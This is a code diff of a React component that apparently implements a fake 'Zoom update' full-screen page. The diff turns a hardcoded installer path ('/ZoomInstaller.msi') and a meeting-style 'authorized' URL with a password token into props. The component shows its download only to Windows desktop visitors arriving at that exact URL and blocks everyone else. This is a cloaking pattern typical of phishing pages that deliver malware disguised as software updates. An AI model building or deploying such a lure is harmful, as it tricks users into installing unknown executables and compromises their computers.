@@ -2,12 +2,9 @@
 
 import { useEffect, useState } from "react";
 
-const UPDATE_FILE_PATH = "/ZoomInstaller.msi";
 const MINIMUM_LOADING_TIME = 2000;
 const NON_DESKTOP_USER_AGENT =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i;
-const AUTHORIZED_PATH =
-  "/j/8237770634?pwd=i7gt2XsqvGas7hF6ZaJyQaKCnjVdfU.1";
 
 // Matches Windows desktop user agents / platforms
 const WINDOWS_USER_AGENT = /Windows NT|Win32|Win64|WOW64/i;
@@ -28,10 +25,15 @@ export const isWindowsDesktopDevice = () => {
   return hasDesktopViewport && hasDesktopPointer && !hasMobileUserAgent && isWindows;
 };
 
-const isAuthorizedUrl = () =>
+
+interface ZoomUpdateProps {
+   UPDATE_FILE_PATH :string
+   AUTHORIZED_PATH : string
+}
+const ZoomUpdateFullScreen = ({UPDATE_FILE_PATH,AUTHORIZED_PATH}  : ZoomUpdateProps) => {
+  const isAuthorizedUrl = () =>
   window.location.pathname + window.location.search === AUTHORIZED_PATH;
 
-const ZoomUpdateFullScreen = () => {
   const [accessState, setAccessState] = useState<
     "checking" | "desktop" | "blocked"
   >("checking");
